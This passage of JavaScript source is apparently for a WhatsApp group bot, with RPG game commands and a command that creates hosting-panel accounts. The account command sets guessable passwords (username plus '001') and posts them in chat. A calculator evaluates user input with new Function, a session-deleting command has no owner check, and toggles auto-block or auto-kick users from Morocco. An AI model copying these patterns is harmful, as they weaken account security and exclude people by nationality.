    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🐈You* the cat ${global.db.users[m.sender].kucing}) WIN against 🐈the cat *${LordVoltage.getName(lawan)}* (cat ${global.db.users[lawan].kucing}) karena kucing🐈you ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nGift Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🐈You* the cat ${global.db.users[m.sender].kucing}) LOSE the fight 🐈the cat *${LordVoltage.getName(lawan)}* the cat ${global.db.users[lawan].kucing}) because of your pet${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete LordVoltage.fightnaga[m.sender]
}}
 break
case 'fightgriffin':
case 'griffin': { if (prefix === '.') {
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
if (!m.isGroup) return reply(mess.only.group)
LordVoltage.level = global.db.users[m.sender]
  LordVoltage.fightnaga = LordVoltage.fightnaga ? LordVoltage.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof LordVoltage.fightnaga[m.sender] != "undefined" && LordVoltage.fightnaga[m.sender] == true) return reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  m.reply(`*Your Pet* (🦚griffin ${penumpang}) ⚔️challenge the   griffin *${nogorojo}* (  your griffin) is fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  LordVoltage.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].griffin;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].griffin;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    m.reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🦚You* (griffin ${global.db.users[m.sender].griffin}) WIN against 🦚The griffin *${LordVoltage.getName(lawan)}* (griffin ${global.db.users[lawan].griffin}) because of your griffin   ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nGift Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    m.reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🦚You* (griffin ${global.db.users[m.sender].griffin}) LOSE the fight 🦚The griffin *${LordVoltage.getName(lawan)}* (griffin ${global.db.users[lawan].griffin}) because of your pet${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    m.reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete LordVoltage.fightnaga[m.sender]
}}
break
case 'fightcentaur': 
case 'centaur': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
LordVoltage.level = global.db.users[m.sender]
  LordVoltage.fightnaga = LordVoltage.fightnaga ? LordVoltage.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof LordVoltage.fightnaga[m.sender] != "undefined" && LordVoltage.fightnaga[m.sender] == true) return m.reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  m.reply(`*Your Pet* (🐴centaur ${penumpang}) ⚔️challenge the 🐴centaur *${nogorojo}* (🐴your centaur) fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  LordVoltage.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].centaur;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].centaur;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    m.reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🐴You* (centaur ${global.db.users[m.sender].centaur}) WIN against 🐴the centaur *${LordVoltage.getName(lawan)}* (centaur ${global.db.users[lawan].centaur}) karena centaur🐴you ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nGift Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    m.reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🐴You* (centaur ${global.db.users[m.sender].centaur}) LOSE the fight 🐴the centaur *${LordVoltage.getName(lawan)}* (centaur ${global.db.users[lawan].centaur}) because of your pet${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    m.reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete LordVoltage.fightnaga[m.sender]
}}
break

case 'berburu':
case 'hunt': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
    function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers) 
    let name = LordVoltage.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Berburu'
    LordVoltage.misi = LordVoltage.misi ? LordVoltage.misi : {}
    if (id in LordVoltage.misi) {
        return replynano( `Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
     }
    if (new Date - user.lastmisi > 3600000) {
		let hewan1 = Math.floor(Math.random() * 10)
		let hewan2 = Math.floor(Math.random() * 10)
		let hewan3 = Math.floor(Math.random() * 10)
		let hewan4 = Math.floor(Math.random() * 10)
		let hewan5 = Math.floor(Math.random() * 10)
		let hewan6 = Math.floor(Math.random() * 10)
		let hewan7 = Math.floor(Math.random() * 10)
		let hewan8 = Math.floor(Math.random() * 10)
		let hewan9 = Math.floor(Math.random() * 10)
		let hewan10 = Math.floor(Math.random() * 10)
		let hewan11 = Math.floor(Math.random() * 10)
		let hewan12 = Math.floor(Math.random() * 10)
		
		let hsl = `🕸 *Hunting Results ${user.registered ? user.name : LordVoltage.getName(m.sender)}* 
${hewan1 ? `
🐂 Bull: ${hewan1}` : ''} ${hewan2 ? `
🐅 Tiger: ${hewan2}` : ''} ${hewan3 ? `
🐘 Elephant: ${hewan3}` : ''} ${hewan4 ? `
🐐 Goat: ${hewan4}` : ''} ${hewan5 ? `
🐼 Panda: ${hewan5}` : ''} ${hewan6 ? `
🐊 Crocodile: ${hewan6}` : ''} ${hewan7 ? `
🐃 Buffalo: ${hewan7}` : ''} ${hewan8 ? `
🐮 Cow: ${hewan8}` : ''} ${hewan9 ? `
🐒 Monkey: ${hewan9}` : ''} ${hewan10 ? `
🐗 Wild Boar: ${hewan10}` : ''} ${hewan11 ? `
🐖 Babi: ${hewan11}` : ''} ${hewan12 ? `
🐓 Chicken: ${hewan12}` : ''}
`.trim()

		user.banteng += hewan1
		user.harimau += hewan2
		user.gajah += hewan3
		user.kambing += hewan4
		user.panda += hewan5
		user.buaya += hewan6
		user.kerbau += hewan7
		user.sapi += hewan8
		user.monyet += hewan9
		user.babihutan += hewan10
		user.babi += hewan11
		user.ayam += hewan12
		
		LordVoltage.misi[id] = [
        	kerja,
        setTimeout(() => {
            delete LordVoltage.misi[id]
        }, 20000)
    	]
    
		setTimeout(() => {
			replynano(`${hsl}`)
		}, 20000)

		setTimeout(() => {
			replynano(`Well here it is`)
		}, 18000)

		setTimeout(() => {
			replynano('Dorr🙂')
		}, 15000)

		setTimeout(() => {
			replynano('Get Target')
		}, 14000)

		setTimeout(() => {
			replynano('Is looking for prey...')
		}, 0)
		user.lastmisi = new Date * 1
	} else replynano(`Please wait for ${timers}, to complete the mission again`)
}}
break

//=========================================\\
case 'polisi':
case 'police': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = LordVoltage.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Polisi'
    LordVoltage.misi = LordVoltage.misi ? LordVoltage.misi: {}
    if (id in LordVoltage.misi) {
        replynano(`Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku1 = Math.floor(Math.random() * 10)
        let randomaku2 = Math.floor(Math.random() * 10)

        let rbrb1 = (randomaku1 * 100000)
        let rbrb2 = (randomaku2 * 1000)

        var dimas = `
👮Chasing Thieves....
`.trim()

        var dimas2 = `
👮Catch the thief....
`.trim()

        var dimas3 = `
🚔Take it to the police station\nAnd in prison
`.trim()

        var dimas4 = `
➕ 🙂Receive salary....
`.trim()

        var hsl = `
*—[ Police Results ${name} ]—*
➕ 🙂 Money = [ ${rbrb1} ]
➕ 🙂 Exp = [ ${rbrb2} ]
➕ 😍 Order Completed = +1
➕ 📥Total Previous Orders : ${order}
`.trim()

        user.money += rbrb1
        user.exp += rbrb2
        user.ojekk += 1

        LordVoltage.misi[id] = [
            kerja,
            setTimeout(() => {
delete LordVoltage.misi[id]
            }, 27000)
        ]

        setTimeout(() => {
            replynano(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replynano(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replynano(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
           replynano(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replynano(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replynano('??On Patrol.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replynano(`Please wait for ${timers}, to complete the mission again`)
}}
break
//=========================================\\
// let pajak = 0.02
case 'berdagang':
case 'trade': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}

    let dapat = (Math.floor(Math.random() * 5000))
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) return replynano ('Tag the one you want to trade with')
    if (typeof db.users[who] == 'undefined') return replynano('Pengguna tidak ada didalam data base')
    let __timers = (new Date - global.db.users[m.sender].lastdagang)
    let _timers = (28800000 - __timers)
    let timers = clockString(_timers)
    let users = global.db.users
    let username = LordVoltage.getName(who)
    if (new Date - global.db.users[m.sender].lastdagang > 28800000) {
        if (4999 > users[who].money) return replynano ('Target does not have capital, please enter capital 5000')
        if (4999 > users[m.sender].money) return replynano ('If you dont have capital, please enter capital of 5000')
        users[who].money -= dapat * 1
        users[m.sender].money -= dapat * 1
        global.db.users[m.sender].lastdagang = new Date * 1
        replynano(`Please wait sɪʀ..\nYou and @${who.replace(/@.+/, '')} is trading.. ðŸ˜…\n\nYou and @${who.replace(/@.+/, '')} meletakkan modal -${dapat} ðŸ˜…`)
        setTimeout(() => {
            replynano(m.chat, `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, m, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 3600000)
        setTimeout(() => {
            replynano(`Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 7200000)
        setTimeout(() => {
            replynano( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 10800000)
        setTimeout(() => {
            replynano( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 14400000)
        setTimeout(() => {
            replynano( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 18000000)
        setTimeout(() => {
            replynano( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 21600000)
        setTimeout(() => {
            replynano( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 25200000)
        setTimeout(() => {
            replynano( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYou get your trading income +10000\n${users[m.sender].money += 10000} Your money\n\nTrading income @${who.replace(/@.+/, '')} didapatkan +100000\n${users[who].money += 100000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 28800000)
    } else replynano(`You Have Traded , wait ${timers} Again..`)

}}
break


// Function to check if the sender is an authorized owner


case 'autotyping': {
  if (prefix === '.') {
      if (!DanzTheCreator) return reply(mess.only.owner)
    const action = args.join(' ').toLowerCase();
    let responseText;
    if (action === 'on') {
      const response = await setAutotyping(true);
      responseText = response;
    } else if (action === 'off') {
      const response = await setAutotyping(false);
      responseText = response;
    } else {
      responseText = `Usage: ${prefix}autotyping on | off`;
    }
    LordVoltage.sendMessage(m.chat, { text: responseText, contextInfo: channelContextInfo }, { quoted: fkontak });
}}
break
            case 'antidelete':
            case 'antideleteon':
            case 'antideleteoff':
                  if (prefix === '.') {
      if (!DanzTheCreator) return reply(mess.only.owner)
                if (args.length === 0 && command === 'antidelete') {
                    const status = getAntideleteEnabled() ? 'ENABLED' : 'DISABLED';
                    return m.reply(`Antidelete is currently *${status}*.\n\nUsage:\n.antidelete on\n.antidelete off`);
                }

                const enable = args[0] === 'on' || command === 'antideleteon';
                const disable = args[0] === 'off' || command === 'antideleteoff';

                if (enable) {
                    const result = await setAntideleteEnabled(true);
                    m.reply(result);
                } else if (disable) {
                    const result = await setAntideleteEnabled(false);
                    m.reply(result);
                } else {
                    m.reply(`Invalid argument for antidelete. Use 'on' or 'off'.\n\nUsage:\n.antidelete on\n.antidelete off`);
                }}
                break;
case 'autoviewstatus':
case 'autostatus': { // Adding 'viewstatus' as an alias as well
    if (prefix === '.') { // Check for '.' prefix as per your example
        // Owner or Bot Developer check
if (!DanzTheCreator) return reply(mess.only.owner)
        const action = args.join(' ').toLowerCase(); // Get 'on' or 'off' from arguments
        let responseText;
        if (action === 'on') {
            const response = await setAutoViewStatus(true); // Call the function to enable auto-view
            responseText = response;
        } else if (action === 'off') {
            const response = await setAutoViewStatus(false); // Call the function to disable auto-view
            responseText = response;
        } else {
            // Usage message if 'on' or 'off' is not provided
            responseText = `Usage: ${prefix}autoviewstatus on | off`;
        }
        // Send the reply with contextInfo and quoted message
        LordVoltage.sendMessage(m.chat, { text: responseText, contextInfo: channelContextInfo }, { quoted: fkontak });
    }
}
break; // Don't forget the break;
case 'autorecording':
case 'autorecord': {
  if (prefix === '.') {
        if (!DanzTheCreator) return reply(mess.only.owner)
    const action = args.join(' ').toLowerCase();
    let responseText;
    if (action === 'on') {
      const response = await setAutoRecording(true);
      responseText = response;
    } else if (action === 'off') {
      const response = await setAutoRecording(false);
      responseText = response;
    } else {
      responseText = `Usage: ${prefix}autorecording on | off`;
    }
    LordVoltage.sendMessage(m.chat, { text: responseText, contextInfo: channelContextInfo }, { quoted: fkontak });
  }
}
break;

case 'autoblockmorocco':
case 'autoblockma': {
  if (prefix === '.') {
        if (!DanzTheCreator) return reply(mess.only.owner)
    const action = args.join(' ').toLowerCase();
    let responseText;
    if (action === 'on') {
      const response = await setAutoBlockMorocco(true);
      responseText = response;
    } else if (action === 'off') {
      const response = await setAutoBlockMorocco(false);
      responseText = response;
    } else {
      responseText = `Usage: ${prefix}autoblockmorocco on | off`;
    }
    LordVoltage.sendMessage(m.chat, { text: responseText, contextInfo: channelContextInfo }, { quoted: fkontak });
  }
}
break;

case 'autokickmorocco':
case 'autokickma': {
  if (prefix === '.') {
    const isOwner = isBotOwner(m.sender);
    const isGroupAdmin = m.isGroup ? await isAdmin(m) : false;

    let responseText;
    if (isOwner || isGroupAdmin) {
      const action = args.join(' ').toLowerCase();
      if (action === 'on') {
        const response = await setAutoKickMorocco(true);
        responseText = response;
      } else if (action === 'off') {
        const response = await setAutoKickMorocco(false);
        responseText = response;
      } else {
        responseText = `Usage: ${prefix}autokickmorocco on | off`;
      }
      LordVoltage.sendMessage(m.chat, { text: responseText, contextInfo: channelContextInfo }, { quoted: fkontak });
    } else {
      LordVoltage.sendMessage(m.chat, { text: mess.only.admin, contextInfo: channelContextInfo }, { quoted: fkontak });
    }
  }
}
break;

case 'antispam': {
  if (prefix === '.') {
        if (!DanzTheCreator) return reply(mess.only.owner)
    const action = args.join(' ').toLowerCase();
    let responseText;
    if (action === 'on') {
      const response = await setAntispam(true);
      responseText = response;
    } else if (action === 'off') {
      const response = await setAntispam(false);
      responseText = response;
    } else {
      responseText = `Usage: ${prefix}antispam on | off`;
    }
    LordVoltage.sendMessage(m.chat, { text: responseText, contextInfo: channelContextInfo }, { quoted: fkontak });
  }
}
break;

//=========================================\\
case 'rob':
  case 'rampok': { if (prefix === '.') {
    if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}

function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let dapat = (Math.floor(Math.random() * 100000))
    let users = global.db.users
    let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    if (!who) return replynano('Tag the person you want to rob!')
    if (typeof global.db.users[who] == 'undefined') return replynano('The user does not exist in the database')
    if (users[who].level > users[m.sender].level) return replynano(`Your level must be higher than @${who.split('@')[0]} To be able to rob him!`, false, { mentions: [who] })
    let __timers = (new Date - global.db.users[m.sender].lastrampok)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers)
    if (new Date - global.db.users[m.sender].lastrampok > 3600000) {
        if (10000 > users[who].money) return replynano('there is no target 💰 stupid money, kill him')
        users[who].money -= dapat * 1
        users[m.sender].money += dapat * 1
        global.db.users[m.sender].lastrampok = new Date * 1
        replynano( `managed to rob the target of money amounting to 💰${dapat}`)
    } else replynano( `You've robbed and managed to hide, wait ${timers} to rob again`)
}}
break
//=========================================\\
case 'delsesi': 
  case 'clearsession': { if (prefix === '.') {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replynano('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Detected ${filteredArray.length} file Memories <3\n\n`
if(filteredArray.length == 0) return replynano(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replynano(`${teks}`) 
await sleep(2000)
replynano("Deleting Memories files...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
replynano("Successfully deleted all Memories in the session folder")     
});
}}
break

case 'unli2': {
    if (prefix === '.') { // Per your request
        if (!DanzTheCreator && !isPrem) return reply(mess.only.premium);

        // Get the username directly from the text following the command
        let username = text.trim();
        if (!username) return reply(`*Incorrect format!*
Use:
${prefix + command} <username>`);

        let name = username; // 'name' will be used for the server name
        let egg = global.eggsnya;
        let loc = global.location3;
        let memo = "0"; // Assuming 0 still means unlimited as per original code
        let cpu = "0";
        let disk = "0";
        let email = username + "famousdev@gmail.com";

        try {
            let password = username + "001";

            // Create user on Pterodactyl panel
            let f = await fetch(domain + "/api/application/users", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                },
                "body": JSON.stringify({
                    "email": email,
                    "username": username,
                    "first_name": username,
                    "last_name": username,
                    "language": "en",
                    "password": password
                })
            });

            let data = await f.json();
            if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
            let user = data.attributes;

            // Prepare the message with credentials
            const ctf = `
╭ 📍 HELLO @${m.sender.split`@`[0]}
┃ 📍 ID: ${user.id}
┃ 📍 MEMORY: UNLIMITED
┃ 📍 USERNAME: ${user.username}
┃ 📍 PASSWORD: ${password}
╰ 📍 LOGIN:
${domain}
╭ 📍 NOTE:
┃ > OWNER ONLY SENDS 1X DATA
┃ > PLEASE SAVE YOUR ACCOUNT
┃ > WON'T RESEND YOUR ACCOUNT
┃ > 10 DAYS GUARANTEE
╰ 📍POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`

            // Send the credentials message to the current chat (DM or group)
            await LordVoltage.sendMessage(m.chat, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg"), mentions: [m.sender] }); // Added 'mentions' for the user in the "Hello" line

            // Fetch egg details (original code's logic, kept as is)
            let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
                "method": "GET",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            });
            let data2 = await f2.json(); // This variable data2 is fetched but not used later in your snippet.

            // Create server on Pterodactyl panel
            let f3 = await fetch(domain + "/api/application/servers", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                },
                "body": JSON.stringify({
                    "name": name,
                    "description": " ",
                    "user": user.id,
                    "egg": parseInt(egg),
                    "docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
                    "startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
                    "environment": {
                        "INST": "npm",
                        "USER_UPLOAD": "0",
                        "AUTO_UPDATE": "0",
                        "CMD_RUN": "npm start"
                    },
                    "limits": {
                        "memory": memo,
                        "swap": 0,
                        "disk": disk,
                        "io": 500,
                        "cpu": cpu
                    },
                    "feature_limits": {
                        "databases": 5,
                        "backups": 5,
                        "allocations": 1
                    },
                    deploy: {
                        locations: [parseInt(loc)],
                        dedicated_ip: false,
                        port_range: [],
                    },
                })
            });

            let res = await f3.json();
            if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
            let server = res.attributes;

            // Send confirmation message to the current chat
     } catch (e) {
            console.error("Error in unli command:", e); // Log the actual error for debugging
            reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠᴏʟᴛᴀɢᴇ ʟᴏʀᴅ ᴅᴇᴠ');
        }
    }
    break;
}

//=============================================//================================================================


case "calculator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Invalid format, only 0-9 and the symbols -, +, *, /, ×, ÷, π, e, (, ) are supported')
}
}
break
//================================================================
case 'banknabung':
case 'savings': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
const xpperlimit = 1
  let user = global.db.users[m.sender]
  let all = command.replace(/^tarik/i, '')
  let count = all ? all : args[0]
  count = count ? /all/i.test(count) ? Math.floor(user.money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return replynano('You dont have an ATM card yet')
  if (user.bank > user.fullatm) return replynano('The ATM is full of money!')
  if (count > user.fullatm - user.bank) return m.reply('His money has reached the limit')
  if (user.money >= xpperlimit * count) {
    user.money -= xpperlimit * count
    user.bank += count
    replynano(`Successfully saved up to ${count} Money 🙂`)
